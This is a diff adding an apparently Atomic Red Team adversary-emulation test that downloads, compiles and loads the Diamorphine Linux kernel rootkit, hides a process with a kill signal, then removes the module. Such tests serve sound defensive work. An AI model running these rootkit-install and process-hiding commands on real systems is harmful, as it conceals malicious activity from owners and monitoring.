@@ -1,0 +1,117 @@
+{
+  "id": "0b996469-48c6-46e2-8155-a17f8b6c2247",
+  "name": "Loadable Kernel Module based Rootkit (Diamorphine)",
+  "description": "Loads Diamorphine kernel module, which hides itself and a processes.\n",
+  "platforms": [
+    "linux"
+  ],
+  "steps": [
+    {
+      "id": "6dc47e3d-a543-4393-ad39-d269042ff289",
+      "type": "execute-command",
+      "data": {
+        "command": "sudo modprobe #{rootkit_name}\nping -c 10 localhost \u003e/dev/null \u0026 TARGETPID=\"$!\"\nps $TARGETPID\nkill -31 $TARGETPID\nps $TARGETPID || echo \"process ${TARGETPID} hidden\"\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "52eb6089-7079-4704-aac7-1a6de77e27e1",
+      "type": "execute-command",
+      "data": {
+        "command": "kill -63 1\nsudo modprobe -r #{rootkit_name}\nsudo rm -rf /lib/modules/$(uname -r)/#{rootkit_name}.ko /tmp/atomic\nsudo depmod -a\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "4f4d4663-578c-4a6b-800e-aed1a2298d40",
+      "name": "Check dependency 1/1",
+      "description": "The kernel module must exist on disk at specified location (#{rootkit_name}.ko)\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "14212223-f805-4325-a0ef-251ea58a2266",
+      "name": "Resolve dependency 1/1",
+      "description": "The kernel module must exist on disk at specified location (#{rootkit_name}.ko)\n",
+      "type": "execute-command",
+      "data": {
+        "command": "mkdir -p /tmp/atomic \u0026\u0026 cd /tmp/atomic\ncurl -sLO #{repo}/archive/#{rev}.zip \u0026\u0026 unzip #{rev}.zip \u0026\u0026 cd Diamorphine-#{rev}\nmake\nsudo cp #{rootkit_name}.ko /lib/modules/$(uname -r)/\nsudo depmod -a\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "88775105-7bab-4baf-8f38-28ac1ab223e8",
+      "name": "Re-check dependency 1/1",
+      "description": "The kernel module must exist on disk at specified location (#{rootkit_name}.ko)\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "6dc47e3d-a543-4393-ad39-d269042ff289",
+      "p": "on-success",
+      "o": "52eb6089-7079-4704-aac7-1a6de77e27e1"
+    },
+    {
+      "s": "6dc47e3d-a543-4393-ad39-d269042ff289",
+      "p": "on-failure",
+      "o": "52eb6089-7079-4704-aac7-1a6de77e27e1"
+    },
+    {
+      "s": "4f4d4663-578c-4a6b-800e-aed1a2298d40",
+      "p": "on-success",
+      "o": "6dc47e3d-a543-4393-ad39-d269042ff289"
+    },
+    {
+      "s": "4f4d4663-578c-4a6b-800e-aed1a2298d40",
+      "p": "on-failure",
+      "o": "14212223-f805-4325-a0ef-251ea58a2266"
+    },
+    {
+      "s": "14212223-f805-4325-a0ef-251ea58a2266",
+      "p": "on-success",
+      "o": "88775105-7bab-4baf-8f38-28ac1ab223e8"
+    },
+    {
+      "s": "88775105-7bab-4baf-8f38-28ac1ab223e8",
+      "p": "on-failure",
+      "o": "6dc47e3d-a543-4393-ad39-d269042ff289"
+    }
+  ],
+  "tags": [
+    "T1014",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "repo",
+      "type": "string",
+      "description": "Url of the diamorphine github repo",
+      "value": "https://github.com/m0nad/Diamorphine/"
+    },
+    {
+      "name": "rev",
+      "type": "string",
+      "description": "Revision of the github repo zip",
+      "value": "898810523aa2033f582a4a5903ffe453334044f9"
+    },
+    {
+      "name": "rootkit_name",
+      "type": "string",
+      "description": "Module name",
+      "value": "diamorphine"
+    }
+  ]
+}
